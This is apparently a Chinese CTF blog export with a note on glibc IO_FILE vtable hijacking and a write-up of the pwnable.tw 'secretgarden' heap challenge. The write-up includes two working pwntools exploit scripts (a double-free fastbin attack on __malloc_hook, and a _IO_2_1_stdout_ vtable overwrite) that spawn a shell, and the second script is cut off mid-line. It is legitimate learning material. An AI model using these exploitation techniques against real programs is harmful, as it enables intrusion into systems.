<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>IO_FILE</title>
      <link href="/2018/11/19/IO_FILE/"/>
      <url>/2018/11/19/IO_FILE/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>最近做题遇到好几次攻击IO_FILE结构体的，整理一下相关资料。（抄 ctf wiki ^ - ^）</p><h3 id="FILE文件结构"><a href="#FILE文件结构" class="headerlink" title="FILE文件结构"></a>FILE文件结构</h3><p>在标准<code>I/O</code> 库中，每个程序启动时有三个文件流是自动打开的：<code>stdin、stdout、stderr</code>。因此在初始状态下，<code>_IO_list_all</code> 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 <code>libc.so</code>的数据段。而我们使用<code>fopen</code>创建的文件流是分配在堆内存上的。</p><a id="more"></a><p>但是事实上<code>_IO_FILE</code> 结构外包裹着另一种结构<code>_IO_FILE_plus</code>，其中包含了一个重要的指针<code>vtable</code>指向了一系列函数指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>vtable</code> 是<code>IO_jump_t</code>类型的指针，<code>IO_jump_t</code>中保存了一些函数指针，在后面我们会看到在一系列标准<code>IO</code>函数中会调用这些函数指针.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="伪造vtable劫持程序流程"><a href="#伪造vtable劫持程序流程" class="headerlink" title="伪造vtable劫持程序流程"></a>伪造vtable劫持程序流程</h3><p>修改<code>vtable</code>，使其指向一个我们可以控制的地址，然后在进行文件操作的时候，就会调用，从而控制程序流程。</p><p>根据 <code>vtable</code>在<code>_IO_FILE_plus</code>的偏移得到 <code>vtable</code> 的地址，在 64 位系统下偏移是 <code>0xd8</code>。之后需要搞清楚欲劫持的 <code>IO</code> 函数会调用<code>vtable</code> 中的哪个函数。关于<code>IO</code> 函数调用 <code>vtable</code>的情况已经在 <code>FILE</code>结构介绍一节给出了，知道了<code>printf</code>会调用 <code>vtable</code> 中的<code>xsputn</code>，并且 <code>xsputn</code>的是 <code>vtable</code> 中第八项之后就可以写入这个指针进行劫持。</p><h3 id="新版本利用"><a href="#新版本利用" class="headerlink" title="新版本利用"></a>新版本利用</h3><p>TODO…</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>pwnable.tw-secretgarden</title>
      <link href="/2018/11/18/pwnable-tw-secretgarden/"/>
      <url>/2018/11/18/pwnable-tw-secretgarden/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>找大佬要来的堆练习题3。</p><p>是pwnable.tw中一道堆的题目。</p><p>有好多种姿势getshell，实在是长见识了。</p><a id="more"></a><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>分析题目流程，比较清晰。raise养花，visit查看，remove移除，clean清除全部。</p><p>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">char</span> color[<span class="number">24</span>];</span><br><span class="line">&#125;flower;</span><br></pre></td></tr></table></figure><p>raise函数，分配一个堆放结构体，flag置1，name为大小由用户指定的堆，color直接读入。最后将结构体插入bss段中的flowers中。</p><p>visit函数，打印所有flag位不为0的flower的name和color。</p><p>remove函数，选择一个flower的index，将flag置0，free掉name，但指针未清空。并且在检查index的之后，只检查了index的合法性和bss上index对应的堆是否存在，并没有检查flag位，所以可以double free。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">99</span> &amp;&amp; (v0 = flowers[index]) != <span class="number">0L</span>L )</span><br><span class="line">&#123;</span><br><span class="line">LODWORD(v0-&gt;flag) = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">free</span>(flowers[index]-&gt;name);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clean函数，基本无关，且无明显漏洞。</p><p>程序保护全开：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><h3 id="利用方式-malloc-hook"><a href="#利用方式-malloc-hook" class="headerlink" title="利用方式 __malloc_hook"></a>利用方式 __malloc_hook</h3><p>首先，利用<code>Unsotred bin</code>泄露出<code>libc</code>的地址，比较简单不再赘述。</p><p>然后，因为有<code>Full RELRO</code>，写<code>got</code>表肯定不行了。这里的做法是通过<code>hook函数</code>劫持程序控制流。但不巧的是<code>__free_hook</code>旁边没有合适的size，所以这里改写<code>__malloc_hook</code>为<code>one_gadget</code>。</p><p>然后，又来个不巧的，找到的所有<code>one_gadget</code>，直接调用<code>malloc</code>都不可用，所以我们选择<code>double free</code>来调用<code>malloc_printerr</code>以此来触发<code>__malloc_hook</code>，经测试，这样是可以的。</p><p>onegadget选取以下第三个。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x45216execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raise_flower</span><span class="params">(lenth, name, color)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice : '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Length of the name :'</span>, str(lenth))</span><br><span class="line">    p.sendlineafter(<span class="string">'The name of flower :'</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">'The color of the flower :'</span>, color)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice : '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Your choice : '</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(</span><br><span class="line">        <span class="string">'Which flower do you want to remove from the garden:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./secretgarden'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc.addr</span></span><br><span class="line">raise_flower(<span class="number">0x100</span>, <span class="string">'0000'</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">raise_flower(<span class="number">0x100</span>, <span class="string">'1111'</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raise_flower(<span class="number">0xc8</span>, <span class="string">''</span>, <span class="string">'cccc'</span>)</span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(<span class="string">'Name of the flower[2] :'</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">leak = (leak &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">libc.address = leak - <span class="number">0x3c4c00</span></span><br><span class="line">p.info(<span class="string">'libc.addr: 0x%x'</span> % libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line">raise_flower(<span class="number">0x60</span>, <span class="string">'3333'</span>, <span class="string">'dddd'</span>)</span><br><span class="line">raise_flower(<span class="number">0x60</span>, <span class="string">'4444'</span>, <span class="string">'eeee'</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify __malloc_hook</span></span><br><span class="line">raise_flower(<span class="number">0x60</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>), <span class="string">'ffff'</span>)</span><br><span class="line">raise_flower(<span class="number">0x60</span>, <span class="string">'6666'</span>, <span class="string">'gggg'</span>)</span><br><span class="line">raise_flower(<span class="number">0x60</span>, <span class="string">'7777'</span>, <span class="string">'hhhh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x13</span> + p64(libc.address + <span class="number">0xf02a4</span>)</span><br><span class="line">raise_flower(<span class="number">0x60</span>, payload, <span class="string">'iiii'</span>)</span><br><span class="line"></span><br><span class="line">p.info(<span class="string">'__malloc_hook: 0x%x'</span> % libc.symbols[<span class="string">'__malloc_hook'</span>])</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="利用方式-IO-2-1-stdout"><a href="#利用方式-IO-2-1-stdout" class="headerlink" title="利用方式 _IO_2_1_stdout_"></a>利用方式 _IO_2_1_stdout_</h3><p>这种方式是，攻击<code>file struct</code>，在我看来，这题用这个方法还是比较好的。</p><p>首先，泄露<code>libc</code>地址和<code>heap</code>地址，比较简单，不再赘述。（注：我脚本写的比较麻烦，主要是为了让堆上面好看一点，各各阶段清晰一点）。</p><p>然后，利用<code>double free</code>分配一个在<code>_IO_2_1_stdout_</code>附近的<code>chunk</code>，这里选在<code>_IO_2_1_stdout_ + 0x9d</code>正好大小合适。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx ((<span class="keyword">void</span> *)&amp;_IO_2_1_stdout_ + <span class="number">0x9d</span> + <span class="number">8</span>)</span><br><span class="line"><span class="number">0x7f89b7d076c5</span> &lt;_IO_2_1_stdout_+<span class="number">165</span>&gt;:   <span class="number">0x000000000000007f</span></span><br></pre></td></tr></table></figure><p>然后修改<code>_IO_2_1_stdout_</code>中的vtable，使vtable中的<code>xsputn</code>指向<code>one_gadget</code>，我们可以在修改<code>vtable</code>的时候顺便把<code>one_gadget</code>放上去，控制好地址就好了。这里是将<code>vtable</code>指向<code>_IO_2_1_stdout_ + 0x98</code>此时，<code>xsputn</code>正好是<code>&amp;vtable - 16</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f89b7d076f0</span> &lt;_IO_2_1_stdout_+<span class="number">208</span>&gt;:   <span class="number">0x00007f89b7a33147</span>      <span class="number">0x00007f89b7d076b8</span></span><br><span class="line">                                                 ^                      ^</span><br><span class="line">                                             one_gadget               vtable</span><br></pre></td></tr></table></figure><p>最后在，执行到<code>printf</code>的时候就会调用<code>vtable</code>的<code>xsputn</code>，从而getshell.</p><h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raise_flower</span><span class="params">(lenth, name, color)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice : '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Length of the name :'</span>, str(lenth))</span><br><span class="line">    p.sendlineafter(<span class="string">'The name of flower :'</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">'The color of the flower :'</span>, color)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice : '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Your choice : '</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(</span><br><span class="line">        <span class="string">'Which flower do you want to remove from the garden:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./secretgarden'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./secretgarden'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc addr</span></span><br><span class="line">raise_flower(<span class="number">0x100</span>, <span class="string">'0000'</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">raise_flower(<span class="number">0x100</span>, <span class="string">'1111'</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raise_flower(<span class="number">0xc8</span>, <span class="string">''</span>, <span class="string">'cccc'</span>)</span><br><span class="line"></span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(<span class="string">'Name of the flower[2] :'</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">leak = (leak &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">libc.address = leak - <span class="number">0x3c4c00</span></span><br><span class="line">p.info(<span class="string">'libc.addr: 0x%x'</span> % libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">raise_flower(<span class="number">0x100</span>, <span class="string">'3333'</span>, <span class="string">'dddd'</span>)</span><br><span class="line">raise_flower(<span class="number">0x10</span>, <span class="string">'4444'</span>, <span class="string">'eeee'</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">raise_flower(<span class="number">0x10</span>, <span class="string">'5555'</span>, <span class="string">'ffff'</span>)</span><br><span class="line">remove(<span class="number">5</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">raise_flower(<span class="number">0x10</span>, <span class="string">''</span>, <span class="string">'gggg'</span>)</span><br><span class="line"></span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(<span class="string">'Name of the flower[6] :'</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">leak = (leak &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">heap_addr = leak - <span class="number">0x1200</span></span><br><span class="line">p.info(<span class="string">'heap_addr: 0x%x'</span> % heap_addr)</span><br><span class="line"></span><br><span class="line">raise_flower(<span class="number">88</span>, <span class="string">'7777'</span>, <span class="string">'hhhh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line">raise_flower(<span class="number">0x60</span>, <span class="string">'8888'</span>, <span class="string">'iiii'</span>)</span><br><span class="line">raise_flower(<span class="number">0x60</span>, <span class="string">'9999'</span>, <span class="string">'jjjj'</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">8</span>)</span><br><span class="line">remove(<span class="number">9</span>)</span><br><span class="line">remove(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.info(<span class="string">'_IO_2_1_stdout_: 0x%x'</span> % libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>])</span><br><span class="line">raise_flower(<span class="number">0x60</span>, p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">0x9d</span>), <span class="string">'kkkk'</span>)</span><br><span class="line">raise_flower(<span class="number">0x60</span>, <span class="string">'BBBB'</span>, <span class="string">'llll'</span>)</span><br><span class="line">raise_flower(<span class="number">0x60</span>, <span class="string">'CCCC'</span>, <span class="string">'mmmm'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify _IO_2_1_stdout</span></span><br><span class="line">one_gadgets = libc.address + <span class="number">0xf1147</span></span><br><span class="line">payload = <span class="string">'\x00\x00\x00'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0xffffffff</span>) </span><br><span class="line">payload += p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(one_gadgets)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">0x98</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Length of the name :'</span>, str(<span 